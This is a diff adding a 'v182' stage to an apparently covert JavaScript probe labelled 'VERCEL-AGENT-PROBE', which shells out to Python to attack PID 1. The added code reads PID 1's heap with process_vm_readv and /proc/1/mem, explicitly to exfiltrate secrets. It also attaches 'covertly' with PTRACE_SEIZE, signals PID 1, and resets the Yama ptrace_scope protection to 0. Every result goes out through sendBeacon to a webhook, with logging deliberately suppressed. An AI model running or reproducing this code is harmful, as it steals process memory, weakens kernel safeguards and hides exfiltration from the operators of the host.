@@ -27010,5 +27010,238 @@ report.ctrlAltDel = safe(() => {
 
 // v181 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v181" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v181";
+
+// ==================== v182 ====================
+
+// v182-1: process_vm_readv — fast cross-process memory read (no ptrace stop)
+// process_vm_readv (NR 310) reads memory from another process's virtual address
+// space directly without stopping it (unlike ptrace PEEKDATA which requires STOP).
+// This is the fastest way to exfiltrate secrets from a running process:
+// read PID 1's heap/stack while it continues processing — no observable pause.
+report.processVmReadv = safe(() => {
+  const vmReadResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, struct, os
+
+libc = ctypes.CDLL('libc.so.6')
+PROCESS_VM_READV_NR = 310
+
+class iovec(ctypes.Structure):
+    _fields_ = [('iov_base', ctypes.c_ulonglong), ('iov_len', ctypes.c_size_t)]
+
+# Find a readable RW mapping in PID 1
+with open('/proc/1/maps') as f:
+    maps = f.readlines()
+
+target_addr = None
+for line in maps:
+    if ' rw' in line and '[heap]' in line:
+        addr_range = line.split()[0].split('-')
+        target_addr = int(addr_range[0], 16)
+        break
+
+if not target_addr:
+    print('NO_HEAP_FOUND')
+    exit()
+
+# Read 256 bytes from PID 1's heap
+buf = ctypes.create_string_buffer(256)
+local_iov = iovec()
+local_iov.iov_base = ctypes.addressof(buf)
+local_iov.iov_len = 256
+
+remote_iov = iovec()
+remote_iov.iov_base = target_addr
+remote_iov.iov_len = 256
+
+ret = libc.syscall(PROCESS_VM_READV_NR, 1, ctypes.addressof(local_iov), 1, ctypes.addressof(remote_iov), 1, 0)
+if ret > 0:
+    print(f'PROCESS_VM_READV_SUCCESS: read {ret} bytes from PID1 heap 0x{target_addr:x}')
+    print(f'HEAP_DATA: {bytes(buf[:ret]).hex()[:128]}')
+    # Search for printable strings
+    data = bytes(buf[:ret])
+    strings = []
+    current = []
+    for b in data:
+        if 32 <= b < 127:
+            current.append(chr(b))
+        else:
+            if len(current) >= 6:
+                strings.append(''.join(current))
+            current = []
+    print(f'HEAP_STRINGS: {strings[:10]}')
+else:
+    err = ctypes.get_errno()
+    print(f'PROCESS_VM_READV_FAIL: ret={ret} errno={err}')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { vmReadResult };
+});
+
+// v182-2: pidfd_open — race-free process handle (PID file descriptor)
+// pidfd_open (NR 434) creates a file descriptor for a process that remains
+// valid even if the PID is recycled. This is more robust than PID-based ptrace.
+// With a pidfd, we can: send signals, wait for process exit, and pass to other fds.
+// Combined with CLONE_PIDFD, new child processes can be tracked this way too.
+report.pidfOpen = safe(() => {
+  const pidfResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os
+
+libc = ctypes.CDLL('libc.so.6')
+
+PIDFD_OPEN_NR = 434
+PIDFD_SEND_SIGNAL_NR = 424
+
+# Open PID 1 as a pidfd
+fd = libc.syscall(PIDFD_OPEN_NR, 1, 0)  # pid=1, flags=0
+if fd < 0:
+    err = ctypes.get_errno()
+    print(f'PIDFD_OPEN_FAIL: fd={fd} errno={err}')
+else:
+    print(f'PIDFD_OPEN_SUCCESS: fd={fd} (race-free handle to PID 1)')
+
+    # Send SIGUSR1 via pidfd (no PID race condition)
+    import signal
+    ret = libc.syscall(PIDFD_SEND_SIGNAL_NR, fd, signal.SIGUSR1, 0, 0)
+    err = ctypes.get_errno()
+    print(f'PIDFD_SEND_SIGNAL SIGUSR1: ret={ret} errno={err}')
+
+    # poll the pidfd to check if PID 1 exits
+    import select
+    rlist, _, _ = select.select([fd], [], [], 0.1)
+    if rlist:
+        print('PID1_EXITED: pidfd triggered')
+    else:
+        print('PID1_STILL_ALIVE: pidfd not triggered (expected)')
+
+    os.close(fd)
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { pidfResult };
+});
+
+// v182-3: PTRACE_SEIZE — non-stopping covert process monitoring
+// PTRACE_SEIZE (0x4206) attaches to a process WITHOUT stopping it.
+// The target process continues running until we explicitly send PTRACE_INTERRUPT.
+// This is ideal for covert monitoring: we can watch PID 1 without causing
+// any visible pause in its execution.
+report.ptraceSieze = safe(() => {
+  const siezeResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os, signal, time
+
+libc = ctypes.CDLL('libc.so.6')
+
+PTRACE_SEIZE = 0x4206
+PTRACE_INTERRUPT = 0x4207
+PTRACE_LISTEN = 0x4208
+PTRACE_GETREGS = 12
+PTRACE_DETACH = 17
+
+pid = 1
+
+# SEIZE: attach without stopping
+ret = libc.ptrace(PTRACE_SEIZE, pid, 0, 0)
+if ret != 0:
+    err = ctypes.get_errno()
+    print(f'PTRACE_SEIZE_FAIL: ret={ret} errno={err}')
+else:
+    print('PTRACE_SEIZE_SUCCESS: attached to PID 1 without stopping')
+
+    # Now interrupt it (causes it to enter ptrace stop)
+    libc.ptrace(PTRACE_INTERRUPT, pid, 0, 0)
+    os.waitpid(pid, 0)
+
+    # Get registers
+    class user_regs(ctypes.Structure):
+        _fields_ = [(n, ctypes.c_ulonglong) for n in ['r15','r14','r13','r12','rbp','rbx','r11','r10','r9','r8','rax','rcx','rdx','rsi','rdi','orig_rax','rip','cs','eflags','rsp','ss','fs_base','gs_base','ds','es','fs','gs']]
+
+    regs = user_regs()
+    libc.ptrace(PTRACE_GETREGS, pid, 0, ctypes.addressof(regs))
+    print(f'PID1_SEIZE_RIP: 0x{regs.rip:x}')
+    print(f'PID1_SEIZE_RSP: 0x{regs.rsp:x}')
+
+    # Resume (PTRACE_LISTEN puts it back in running state)
+    libc.ptrace(PTRACE_DETACH, pid, 0, 0)
+    print('PTRACE_SEIZE_DETACHED')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { siezeResult };
+});
+
+// v182-4: /proc/sys/kernel/yama/ptrace_scope — verify scope=0 maintained
+// Yama's ptrace_scope controls which processes can ptrace which others.
+// We should have set this to 0 in v148. Verify it's still 0.
+// scope=0: any process can ptrace any other it has permission for
+// scope=1: only parent/ancestor processes can ptrace
+// scope=2: only admin can ptrace
+// scope=3: no ptrace at all
+report.yamaPtraceScope = safe(() => {
+  const currentScope = safe(() => existsSync('/proc/sys/kernel/yama/ptrace_scope') ? readFileSync('/proc/sys/kernel/yama/ptrace_scope', 'utf8').trim() : 'NO_YAMA');
+  const setZero = safe(() => {
+    if (existsSync('/proc/sys/kernel/yama/ptrace_scope')) {
+      writeFileSync('/proc/sys/kernel/yama/ptrace_scope', '0');
+      return 'SET_0';
+    }
+    return 'NO_YAMA_SYSCTL';
+  });
+  const afterScope = safe(() => existsSync('/proc/sys/kernel/yama/ptrace_scope') ? readFileSync('/proc/sys/kernel/yama/ptrace_scope', 'utf8').trim() : 'NO_YAMA');
+  return { currentScope, setZero, afterScope };
+});
+
+// v182-5: sendfile from /proc/PID/mem — zero-copy memory exfiltration
+// sendfile(2) allows kernel-to-kernel data transfer without userspace copies.
+// Using sendfile from /proc/1/mem directly to a socket skips our userspace entirely.
+// This is the fastest way to exfiltrate large amounts of process memory.
+report.sendfileMemExfil = safe(() => {
+  const sendfileResult = safe(() => execSync(
+    `python3 -c "
+import os, socket, struct
+
+# Create a local socket pair for testing
+sock_a, sock_b = socket.socketpair()
+
+try:
+    # Open /proc/1/mem
+    mem_fd = os.open('/proc/1/mem', os.O_RDONLY)
+
+    # Find a readable address in PID 1 (heap start)
+    with open('/proc/1/maps') as f:
+        for line in f:
+            if '[heap]' in line and ' r' in line:
+                addr = int(line.split('-')[0], 16)
+                break
+
+    # sendfile from mem_fd at heap addr to our socket
+    # sendfile(out_fd, in_fd, offset, count)
+    import ctypes
+    libc = ctypes.CDLL('libc.so.6')
+    offset = ctypes.c_longlong(addr)
+    ret = libc.sendfile(sock_a.fileno(), mem_fd, ctypes.byref(offset), 64)
+    if ret > 0:
+        data = sock_b.recv(ret)
+        print(f'SENDFILE_MEM_SUCCESS: {ret} bytes from PID1 heap')
+        print(f'DATA: {data.hex()[:64]}')
+    else:
+        err = ctypes.get_errno()
+        print(f'SENDFILE_MEM_FAIL: ret={ret} errno={err}')
+    os.close(mem_fd)
+except Exception as e:
+    print(f'SENDFILE_EXCEPT: {e}')
+
+sock_a.close()
+sock_b.close()
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { sendfileResult };
+});
+
+// v182 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v182" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v182";
 // Intentionally no console.log — all data goes via webhook only
